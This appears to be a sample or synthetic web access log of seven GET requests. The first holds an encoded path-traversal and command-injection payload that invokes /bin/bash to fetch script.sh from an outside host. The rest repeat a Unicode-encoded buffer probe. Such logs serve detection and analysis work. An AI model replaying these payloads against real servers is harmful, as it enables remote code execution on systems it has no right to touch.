182.34.27.162 - - [18/May/2019:03:03:24 +0200] "GET /api/v1/register/%2e%2e%2f%2e%2e%2f%2e%2e%2f/bin/bashhttp%3a%2f%2fwww.dvvv23.cin%2fscript.sh HTTP/1.0" 200 3203 "/api/v1/login/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36"
121.225.26.201 - - [18/May/2019:03:03:25 +0200] "GET /index.php/%u0061?[buffer]=89898 HTTP/1.0" 200 32517 "/index.php/" "Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4"
121.225.26.201 - - [18/May/2019:03:03:25 +0200] "GET /index.php/%u0061?[buffer]=89898 HTTP/1.0" 200 67348 "/index.php/" "Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4"
121.225.26.201 - - [18/May/2019:03:03:25 +0200] "GET /index.php/%u0061?[buffer]=89898 HTTP/1.0" 200 13370 "/index.php/" "Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4"
121.225.26.201 - - [18/May/2019:03:03:25 +0200] "GET /index.php/%u0061?[buffer]=89898 HTTP/1.0" 200 61572 "/index.php/" "Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4"
121.225.26.201 - - [18/May/2019:03:03:25 +0200] "GET /index.php/%u0061?[buffer]=89898 HTTP/1.0" 200 79875 "/index.php/" "Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4"
121.225.26.201 - - [18/May/2019:03:03:25 +0200] "GET /index.php/%u0061?[buffer]=89898 HTTP/1.0" 200 89894 "/index.php/" "Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4"
